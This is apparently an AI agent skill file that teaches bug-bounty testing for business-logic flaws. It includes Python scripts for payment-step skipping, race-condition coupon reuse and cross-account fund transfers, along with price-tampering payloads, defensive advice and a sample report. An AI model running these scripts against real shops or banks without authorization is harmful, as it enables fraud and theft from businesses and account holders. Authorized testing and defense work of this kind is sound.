---
name: business-logic-bypass
description: >
  Identify and exploit flaws in the core business rules and logic of web applications. This skill
  focuses on manipulation of application workflows, pricing, inventory limitations, and multi-step
  processes. Use this skill when bug hunting or testing e-commerce, banking, or SaaS platforms
  where standard technical vulnerabilities (e.g., XSS/SQLi) are not present but the application's
  logic is flawed.
domain: cybersecurity
subdomain: bug-hunting
category: Logic Flaws
difficulty: advanced
estimated_time: "4-8 hours"
mitre_attack:
  tactics: [TA0040]
  techniques: [T1499, T1565]
platforms: [linux, windows, macos]
tags: [business-logic, bug-bounty, e-commerce, race-conditions, parameter-tampering, order-manipulation]
tools: [burpsuite, python]
version: "1.0"
author: CyberSkills-Elite
license: Apache-2.0
---

# Business Logic Flaws & Bypasses

## When to Use
- When testing critical business functions (Checkout carts, Fund transfers, Password resets, Subscription tiers).
- During deep manual penetration tests and Bug Bounty programs (logic bugs yield very high bounties and cannot be found by automated scanners).
- When standard input validation tools (SQLmap, XSS payloads) yield no results.


## Prerequisites
- Authorized scope and target URLs from bug bounty program
- Burp Suite Professional (or Community) configured with browser proxy
- Familiarity with OWASP Top 10 and common web vulnerability classes
- SecLists wordlists for fuzzing and enumeration

## Workflow

### Phase 1: Application Mapping & Rule Identification

```text
# 1. Map the 'Happy Path'
# Use the application exactly as intended. Buy an item, apply a coupon, check out, track shipping.
# Intercept all traffic using Burp Suite and send it to the Proxy History.

# 2. Identify Business Rules (The Assumptions)
# What is the application assuming you will do?
# Examples:
# - A user will a coupon once.
# - A user will not put a negative quantity in the shopping cart.
# - A user must pay step 3 before jumping to step 4 (download).
# - A user will only transfer funds from an account they own.
```

### Phase 2: Price and Parameter Tampering

```python
# Focus: Tampering with invisible parameters or data types during transit.

# 1. Negative Values & Integer Overflow
# Send POST /cart/add
# {"item_id": 12, "quantity": -10}
# Try negative quantities to reduce the total cart price.
# Try MAX_INT (2147483647 + 1) to roll over prices to negative values.

# 2. Price Manipulation directly
# Send POST /checkout
# Does the client decide the price instead of the DB?
# {"item_id": 12, "price": 0.01}

# 3. Currency / Type Mismatch
# Send POST /transfer
# {"amount": "100.00USD", "to": "attacker"}
# What if you change currency? {"amount": "100.00JPY"}
# What if you pass an Array instead of a String? {"amount": [1000]}
```

### Phase 3: Workflow Order Circumvention (Skipping Steps)

```python
import requests

# Scenario: Skip payment step in checkout flow
# Step 1: /cart → Step 2: /shipping → Step 3: /payment → Step 4: /download
# Attack: Skip Steps 2+3, go directly to Step 4

SESSION = requests.Session()
BASE = "https://target.com"

# Step 1: Add item to cart (legitimate)
SESSION.post(f"{BASE}/api/cart/add", json={"item_id": 42, "quantity": 1})

# SKIP Step 2 (shipping) and Step 3 (payment) entirely
# Jump directly to download endpoint
resp = SESSION.post(f"{BASE}/api/download_digital_goods", json={"cart_id": "current"})
if resp.status_code == 200:
    print(f"[+] WORKFLOW BYPASS: Downloaded without payment! Response: {resp.text[:200]}")
else:
    print(f"[-] Blocked: {resp.status_code} — Server enforces step ordering")
```

### Phase 4: Coupon & Discount Abuse (Race Conditions)

```python
import requests
import concurrent.futures

# Race condition: Apply single-use coupon multiple times simultaneously
BASE = "https://target.com"
COUPON_CODE = "SAVE50"
AUTH_TOKEN = "Bearer YOUR_TOKEN"

def apply_coupon(attempt_num):
    resp = requests.post(
        f"{BASE}/api/cart/apply-coupon",
        json={"coupon": COUPON_CODE},
        headers={"Authorization": AUTH_TOKEN},
        timeout=5,
    )
    return f"Attempt {attempt_num}: {resp.status_code} — {resp.text[:100]}"

# Fire 30 concurrent requests to exploit TOCTOU window
with concurrent.futures.ThreadPoolExecutor(max_workers=30) as executor:
    futures = [executor.submit(apply_coupon, i) for i in range(30)]
    for future in concurrent.futures.as_completed(futures):
        result = future.result()
        if "applied" in result.lower() or "200" in result:
            print(f"[+] {result}")
        else:
            print(f"[-] {result}")
```

### Phase 5: Account/Trust Boundary Manipulation

```python
import requests

BASE = "https://target.com/api/v1"

# Cross-object reference: Use attacker's auth but victim's resource IDs
ATTACKER_TOKEN = "Bearer ATTACKER_JWT"
VICTIM_ACCOUNT_ID = "ACC-7890"
ATTACKER_ACCOUNT_ID = "ACC-1234"

# Test 1: Transfer from victim's account using attacker's session
resp = requests.post(
    f"{BASE}/transfer",
    json={"from_account": VICTIM_ACCOUNT_ID, "to_account": ATTACKER_ACCOUNT_ID, "amount": 100.00},
    headers={"Authorization": ATTACKER_TOKEN},
)
print(f"Transfer test: {resp.status_code} — {resp.text[:200]}")
if resp.status_code == 200:
    print("[+] CRITICAL: Server does not verify account ownership on transfers!")

# Test 2: Access premium features with free account token
resp = requests.get(
    f"{BASE}/premium/dashboard",
    headers={"Authorization": ATTACKER_TOKEN},  # Free account token
    params={"user_ref": VICTIM_ACCOUNT_ID},      # Premium account reference
)
if resp.status_code == 200 and "premium" in resp.text.lower():
    print("[+] TRUST BOUNDARY BYPASS: Free account accessed premium features!")
```


## 🔵 Blue Team Detection & Defense
- **Server-Side Truth**: NEVER trust the client to dictate prices, quantities, payment status, or access levels. Calculate prices exclusively on the backend based on item IDs.
- **Workflow State Machines**: Ensure multi-step processes rely on strict strict server-side state machines. Step D cannot execute unless the DB confirms Step C completed successfully.
- **Database Locks (Mutexes)**: Prevent Race Conditions (Time-of-Check to Time-of-Use flaws) by utilizing row-level database locks (e.g., `SELECT ... FOR UPDATE`) during crucial transactions like coupon application or fund transfers.
- **Type Casting & Validation**: Strictly type-cast input. Validate that quantities are whole numbers greater than zero.

## Key Concepts
| Concept | Description |
|---------|-------------|
| Business Logic | The custom rules governing how a specific application operates, independent of standard technical code |
| Parameter Tampering | Changing hidden form fields, cookies, or API data strings in transit |
| TOCTOU | Time-of-Check to Time-of-Use; a race condition where data is modified between checking permission and executing the action |
| State Validation | Confirming a user has completed prerequisites before allowing subsequent actions |

## Output Format
```
Bug Bounty Submission Report
============================
Vulnerability: Critical Business Logic Flaw (Price Manipulation via Integer Overflow)
Target: https://shop.target.com/api/cart

Summary:
The shopping cart API suffers from a severe logic flaw involving integer overflows. By adding an item to the cart with a quantity exceeding the 32-bit signed integer capacity (e.g., 2,147,483,648), the calculated total price rolls over into a massive negative value.

Reproduction Steps:
1. Add any expensive item (e.g., a $1,000 Laptop) to the cart.
2. Intercept the request. Modify the quantity parameter: `{"itemId": "123", "quantity": 2147483648}`.
3. Observe the cart total displays `- $2,147,483.00`.
4. Add another expensive item to bring the total slightly above $0 to satisfy payment gateway validation.
5. Successfully check out acquiring thousands of dollars of equipment for $1.00.

Impact: Total compromise of store revenue model and massive potential financial loss.
```


## 📚 Shared Resources
> For cross-cutting methodology applicable to all vulnerability classes, see:
> - [`_shared/references/elite-chaining-strategy.md`](../_shared/references/elite-chaining-strategy.md) — Exploit chaining methodology and high-payout chain patterns
> - [`_shared/references/elite-report-writing.md`](../_shared/references/elite-report-writing.md) — HackerOne-optimized report writing, CWE quick reference
> - [`_shared/references/real-world-bounties.md`](../_shared/references/real-world-bounties.md) — Verified disclosed bounties by vulnerability class

## References
- PortSwigger: [Business Logic Vulnerabilities](https://portswigger.net/web-security/logic-flaws)
- OWASP: [Testing for Business Logic](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/README)
